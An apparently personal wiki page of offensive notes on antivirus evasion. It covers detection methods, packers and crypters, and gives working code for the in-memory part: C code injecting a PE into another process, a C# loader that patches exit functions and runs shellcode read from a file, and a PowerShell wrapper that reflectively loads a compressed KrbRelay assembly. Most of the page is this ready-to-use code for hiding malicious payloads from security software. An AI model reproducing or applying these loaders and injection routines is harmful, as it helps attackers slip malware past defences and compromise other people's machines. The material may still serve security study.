---
title: Antivirus Evasion
date: M01-29-2023
author: i4
---
#evasion


## Reading
- [FinFisher](https://www.microsoft.com/en-us/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/)

## Detection Methods

- Many AVs use a combination of those detection methods.

### Signature based
- Uses known strings / byte sequences
- Can be evaded using obfuscation
### Heuristic based
- Check the action the binary takes
- The idea is to look for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.
- Steps through the instruction set of a binary or attempts to decompile and analyze the src.
### Behavior based
- Dynamically analyzes the behavior.
- Most of the time executes the binary in a sandbox.


## On-Disk evasion
- https://www.enigmaprotector.com/en/home.html
#### Packers
Mostly not sufficient if it's not a propitiatory packer.
- [UPX Packer](/wiki/Security/Tools/UPX%20/Packer.md)
#### Obfuscators
- `uglify-js` - JavaScript obfuscator
#### Crypters
Adds a decrypting stub which is executed in memory at runtime
- RC4 encryption
- XOR encryption

## In-Memory evasion
### Remote Process Memory Injection
- Inject the payload into another valid PE over win32 API

![Process Injection](/w/images/process_injection.png)

#### Code
```C#
#include <stdio.h>
#include <stdio.h>
#include <Windows.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint() {
	CHAR moduleName[128] = "";
	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
	MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
	return 0;
}

int main()
{
	// Get current image's base address
	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// Allocate a new memory block and copy the current PE image to this new memory block
	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// Open the target process - this is process we will be injecting this PE into
	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 9304);
	
	// Allote a new memory block in the target process. This is where we will be injecting this PE
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);

	return 0;
}
```

### Reflective DLL Injection
- Loads a DLL from memory.
* Includes creating the PE structure in memory since DLLs can't be loaded from memory normally with `LoadLibrary`.

#### C\#
- Use [Donut](https://github.com/S4ntiagoP/donut/tree/syscalls) to create shellcode out of PE files.
- Compile with `csc.exe /target:library /out:MyClass.dll MyClass.cs`
```C#
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.IO;

namespace ShellcodeInject
{
    public class Program
    {


        // Exitpatcher function stolen from From Nettitudes RunPE -> https://gith:w!
        ub.com/nettitude/RunPE 

        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpFlOldProtect);

        internal static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
        {

            var moduleHandle = GetModuleHandle(dllName);
            var pFunc = GetProcAddress(moduleHandle, funcName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);


            var result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect);
            if (!result)
            {

                return null;
            }

            Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);


            result = VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out _);
            if (!result)
            {
            }

            return originalBytes;
        }

        private byte[] _terminateProcessOriginalBytes;
        private byte[] _ntTerminateProcessOriginalBytes;
        private byte[] _rtlExitUserProcessOriginalBytes;
        private byte[] _corExitProcessOriginalBytes;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        internal bool PatchExit()
        {


            var hKernelbase = GetModuleHandle("kernelbase");
            var pExitThreadFunc = GetProcAddress(hKernelbase, "ExitThread");

            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
             */
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes =
                PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
            {
                return false;
            }
            _corExitProcessOriginalBytes =
                PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
            {
                return false;
            }

            _ntTerminateProcessOriginalBytes =
                PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
            {
                return false;
            }


            _rtlExitUserProcessOriginalBytes =
                PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
            {
                return false;
            }

            return true;
        }

        internal void ResetExitFunctions()
        {

            PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);

            PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);

            PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);

            PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);

        }

        private delegate IntPtr GetPebDelegate();


        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        public static void Inject()
        {

            byte[] buf1 = File.ReadAllBytes(@"[path to file]");
            uint num;
            IntPtr pointer = Marshal.AllocHGlobal(buf1.Length);
            Marshal.Copy(buf1, 0, pointer, buf1.Length);
            VirtualProtect(pointer, new UIntPtr((uint)buf1.Length), (uint)0x40, out num);

            var mc = new Program();

            bool patched = mc.PatchExit();
            Console.WriteLine("\r\nExit functions patched: " + patched + "\r\n\r\n");

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, pointer, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            Console.WriteLine("Thread Complete");

            mc.ResetExitFunctions();


        }

    }
}
```

#### Load from powershell
```powershell
$dllbytes = [io.file]::ReadAllBytes("C:\Users\i4\source\repos\gen2\gen2\MyClass.dll")
[System.Reflection.Assembly]::Load($dllbytes)

GAC    Version        Location
---    -------        --------
False  v4.0.30319

PS C:\Users\i4\source\repos\gen2\gen2> [MyNamespace.MyClass]::MyMethod()

```

```wrapper
	$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("xxx")
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [KrbRelay.Program]::main([string[]]$args)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
```

### Process Hollowing
* [Process Hollowing and PE Image relocation](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)
- Replaces a suspended processes Image with a malicious file

![Process Hollowing](/w/images/process_hooking.png)


### Inline hooking
- Modify process memory 
- Redirect the code execution into a new function
- Return back to normal execution

![Inline Hooking](/w/images/inline_hooking.png)
